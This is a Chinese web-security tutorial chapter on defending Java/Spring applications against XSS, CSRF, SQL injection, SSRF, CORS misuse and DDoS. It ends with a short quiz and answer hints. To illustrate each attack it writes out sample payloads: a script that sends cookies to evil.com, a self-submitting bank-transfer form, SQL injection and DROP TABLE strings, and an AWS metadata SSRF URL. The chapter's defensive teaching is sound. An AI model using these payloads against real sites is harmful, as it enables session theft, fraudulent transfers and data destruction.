# 91-常见Web攻击防御

> 💡 你家的防盗门有猫眼、有反锁、有门链。但你邻居只在门框上贴了张"A4纸写的'请勿进入'"——你觉得谁家更安全？Web 安全不是"加个登录就行"，攻击者不会走正门，他们会翻窗、撬锁、钻通风管道。本章带你认识最常见的 6 种攻击手法，并告诉你如何堵上这些漏洞。

---

## 本章目标
- 理解 XSS、CSRF、SQL 注入、SSRF、CORS 滥用、DDoS 的攻击原理
- 掌握每种攻击的防御手段
- 知道 Spring Security 默认帮你防了什么
- 形成"写代码时下意识想到安全问题"的肌肉记忆

---

## 91.1 XSS（跨站脚本攻击）

### 攻击原理

用户在评论区输入：

```html
这篇文章很好<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>
```

如果你的网站把这段内容原样渲染到页面：

```html
<div class="comment">
    这篇文章很好<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>
</div>
```

那么每个看到这条评论的人，浏览器都会执行这段 script——把 cookie 发送到攻击者的服务器。

### 防御手段

| 方法 | 说明 |
|------|------|
| **HTML 转义** | `<` 转成 `&lt;`，`>` 转成 `&gt;` |
| **CSP（Content Security Policy）** | HTTP 响应头声明"只允许加载本站脚本" |
| **HttpOnly Cookie** | Cookie 设 `HttpOnly` 标志，JavaScript 不可读 |
| **输入验证与输出编码** | 前端展示任何用户输入时都编码 |

### Java 中的防御

```java
// Spring 默认对 JSP/Thymeleaf 模板变量做了 HTML 转义
// Thymeleaf: <span th:text="${comment}"> → 自动转义
// Thymeleaf: <span th:utext="${comment}"> → 不转义（危险！）

// JSON 接口中：对用户输入做转义
String safe = HtmlUtils.htmlEscape(userInput);

// 配置 CSP 响应头
response.setHeader("Content-Security-Policy",
    "default-src 'self'; script-src 'self'; style-src 'self'");
```

---

## 91.2 CSRF（跨站请求伪造）

### 攻击原理

1. 你登录了 `bank.com`，浏览器存了 `bank.com` 的 Cookie
2. 你打开了另一个标签页，访问了攻击者的网站 `evil.com`
3. `evil.com` 的页面里有一个隐藏表单：

```html
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

4. 浏览器向 `bank.com` 发送 POST 请求时，自动带上了你的 Cookie
5. `bank.com` 看到你的 Cookie，认为请求是你本人发的——转账成功

### 防御手段

| 方法 | 说明 |
|------|------|
| **CSRF Token** | 每次表单生成一个随机 token，提交时验证 |
| **SameSite Cookie** | `Set-Cookie: SameSite=Strict`，跨站请求不发送 Cookie |
| **自定义请求头** | 前后端分离项目，要求前端带自定义头（如 `X-Requested-With`） |
| **Referer/Origin 校验** | 检查请求来源 |

### Spring Security 的做法

```java
// Spring Security 默认开启 CSRF 保护
// 表单页面自动注入 _csrf token:
//   <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>

// 前后端分离 REST API 可以关闭：
http.csrf(csrf -> csrf.disable());  // 前提：你的 token 不在 Cookie 里
```

> ⚠️ 关 CSRF 的前提是你的 token 放在 `Authorization: Bearer xxx` Header 里——浏览器不会自动带这个 Header，攻击者无法在跨站请求中注入。

---

## 91.3 SQL 注入

### 攻击原理

```java
// ❌ 危险：字符串拼接 SQL
String username = request.getParameter("username");
String sql = "SELECT * FROM user WHERE username = '" + username + "'";
jdbcTemplate.query(sql, ...);
```

攻击者输入用户名：`' OR '1'='1' --`

最终 SQL 变成：

```sql
SELECT * FROM user WHERE username = '' OR '1'='1' --'
```

`'1'='1'` 永远为 true，`--` 注释掉后面的内容——查出所有用户。

更危险的：

```
用户名输入：'; DROP TABLE user; --
```

### 防御手段

```java
// ✅ 参数化查询（PreparedStatement）
String sql = "SELECT * FROM user WHERE username = ?";
jdbcTemplate.query(sql, (rs, rowNum) -> mapUser(rs), username);

// ✅ JPA / MyBatis 参数绑定
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

// ✅ MyBatis 使用 #{} 而不是 ${}
// #{} → 参数化（安全）
// ${} → 字符串拼接（危险！仅用于动态表名/列名等无法参数化的场景）
```

> 🤔 想多一点：ORM 框架不能完全防止 SQL 注入。如果你用 JPA 的原生查询拼接字符串，一样会注入。防御 SQL 注入的唯一可靠手段是**参数化查询**。

---

## 91.4 SSRF（服务器端请求伪造）

### 攻击原理

你的网站有一个功能：用户输入 URL，服务器去抓取那个 URL 的内容（比如"分享链接自动抓标题和缩略图"）。

攻击者输入：`http://169.254.169.254/latest/meta-data/`（AWS 元数据服务地址）

如果你的服务器在 AWS 上，这个请求会返回服务器的密钥、安全组等敏感信息。

### 防御手段

| 方法 | 说明 |
|------|------|
| **URL 白名单** | 只允许请求已知的外部域名 |
| **内网 IP 黑名单** | 禁止请求 `10.*`、`172.16-31.*`、`192.168.*`、`127.*` |
| **禁用重定向** | 不允许服务端跟随 302 重定向 |
| **协议限制** | 只允许 http/https，禁止 `file://`、`gopher://` 等 |

```java
public boolean isSafeUrl(String urlStr) throws MalformedURLException {
    URL url = new URL(urlStr);
    String host = url.getHost();
    InetAddress addr = InetAddress.getByName(host);

    if (addr.isLoopbackAddress() || addr.isSiteLocalAddress() || addr.isLinkLocalAddress()) {
        return false;  // 禁止内网地址
    }

    String protocol = url.getProtocol();
    if (!"http".equals(protocol) && !"https".equals(protocol)) {
        return false;
    }

    return true;
}
```

---

## 91.5 CORS 滥用

### 问题

你配了 CORS 允许所有来源：

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
                .allowedOrigins("*")       // ❌ 允许任何网站访问
                .allowedMethods("*")
                .allowCredentials(true);   // ❌ 允许带 Cookie
    }
}
```

这意味着任何网站都可以跨域请求你的 API，甚至可以带着用户的 Cookie。

### 正确做法

```java
@Override
public void addCorsMappings(CorsRegistry registry) {
    registry.addMapping("/api/**")
            .allowedOrigins("https://your-frontend.com")  // ✅ 只允许你自己的前端
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("*")
            .allowCredentials(false);  // ✅ 如果不需要 Cookie
}
```

> ⚠️ `allowedOrigins("*")` 和 `allowCredentials(true)` **不能同时使用**。浏览器会直接拒绝这种配置。

---

## 91.6 DDoS（分布式拒绝服务）

DDoS 不是"破解"你的系统，而是"淹死"你的系统——攻击者用大量肉鸡同时请求你的服务器，耗尽带宽或连接池。

### 防御层次

| 层次 | 方案 |
|------|------|
| 网络层 | CDN（Cloudflare/AWS CloudFront）、黑洞路由 |
| 应用层 | 限流（Rate Limiting）、验证码、WAF |
| 代码层 | 接口耗时优化、缓存、异步处理 |

### Java 中的限流

```java
// 使用 Bucket4j 令牌桶算法
@Component
public class RateLimiter {

    private final ConcurrentHashMap<String, Bucket> buckets = new ConcurrentHashMap<>();

    public boolean tryConsume(String userId) {
        Bucket bucket = buckets.computeIfAbsent(userId, k -> {
            Refill refill = Refill.greedy(10, Duration.ofMinutes(1)); // 每分钟 10 次
            Bandwidth limit = Bandwidth.classic(10, refill);
            return Bucket.builder().addLimit(limit).build();
        });
        return bucket.tryConsume(1);
    }
}
```

---

## 91.7 Spring Security 默认帮你防了什么

| 攻击类型 | Spring Security 默认防护 |
|----------|------------------------|
| CSRF | ✅ 默认开启 |
| XSS | ⚠️ 依赖模板引擎（Thymeleaf 默认转义） |
| Clickjacking | ✅ `X-Frame-Options: DENY` |
| Session Fixation | ✅ 登录后自动更换 Session ID |
| MIME Sniffing | ✅ `X-Content-Type-Options: nosniff` |
| SQL 注入 | ❌ 需自己用参数化查询 |

---

## 91.8 小结

| 攻击 | 原理 | 防御 |
|------|------|------|
| XSS | 注入恶意脚本 | HTML 转义 + CSP + HttpOnly Cookie |
| CSRF | 跨站借用 Cookie 发起请求 | CSRF Token + SameSite Cookie |
| SQL 注入 | 拼接恶意 SQL | 参数化查询（PreparedStatement） |
| SSRF | 诱导服务器请求内网 | URL 白名单 + 内网 IP 黑名单 |
| CORS 滥用 | 跨域配置过于宽松 | 精确限制 allowedOrigins |
| DDoS | 海量请求淹死服务器 | CDN + 限流 + WAF |

---

## 91.9 自测题

**1. 以下哪些防御手段可以防御 XSS 攻击？（多选）**

A. HTML 转义用户输入  
B. Cookie 设置 HttpOnly  
C. 使用 PreparedStatement  
D. 配置 CSP 响应头  

**2. 你的项目是前后端分离的（Vue + Spring Boot），token 放在 `Authorization` Header 中。你需要开启 CSRF 保护吗？为什么？**

**3. 以下代码是否安全？如果不安全，怎么改？**

```java
String userId = request.getParameter("id");
String sql = "DELETE FROM user WHERE id = " + userId;
jdbcTemplate.execute(sql);
```

---

**答案提示**：1→A、B、D。C 是防 SQL 注入的。2→不需要。CSRF 攻击依赖浏览器自动带 Cookie，而 Authorization Header 需要前端主动设置，跨站请求无法伪造。3→不安全，存在 SQL 注入。应改为 `jdbcTemplate.update("DELETE FROM user WHERE id = ?", userId)`。下一章——加密基础。